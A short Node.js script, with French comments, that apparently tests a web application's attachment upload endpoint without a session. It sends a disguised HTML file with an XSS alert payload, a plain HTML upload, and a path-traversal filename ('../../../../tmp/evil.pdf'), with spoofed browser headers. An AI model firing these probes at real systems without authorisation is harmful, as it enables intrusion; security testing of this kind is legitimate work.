const APP="https://aarme.cyberaar.io";
const UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
// un vrai PDF minimal (1 page) - inoffensif
const PDF = Buffer.from("%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n","latin1");
async function up(label, filename, type, content){
  const fd=new FormData();
  fd.append("file", new Blob([content],{type}), filename);
  const t0=Date.now();
  try{
    const r=await fetch(APP+"/api/aarme/attachment",{method:"POST",headers:{"User-Agent":UA,Origin:APP,Referer:APP+"/soumettre/"},body:fd,redirect:"manual",signal:AbortSignal.timeout(25000)});
    const t=await r.text();
    console.log("  "+label.padEnd(46)+"HTTP "+r.status+" "+String(Date.now()-t0).padStart(5)+"ms  "+t.replace(/\s+/g," ").slice(0,180));
    return {s:r.status,txt:t};
  }catch(e){console.log("  "+label.padEnd(46)+"ERR "+e.message);return{s:0,txt:e.message};}
}
console.log("=== POST /api/aarme/attachment SANS session ===");
await up("PDF minimal, type application/pdf","rapport.pdf","application/pdf",PDF);
await new Promise(r=>setTimeout(r,4000));
await up("HTML deguise en .pdf (type pdf)","rapport.pdf","application/pdf",Buffer.from("<html><body><script>alert(1)</script>ping</body></html>"));
await new Promise(r=>setTimeout(r,4000));
await up("HTML type text/html, nom .html","x.html","text/html",Buffer.from("<html><body>ping</body></html>"));
await new Promise(r=>setTimeout(r,4000));
await up("nom avec traversee de chemin","../../../../tmp/evil.pdf","application/pdf",PDF);
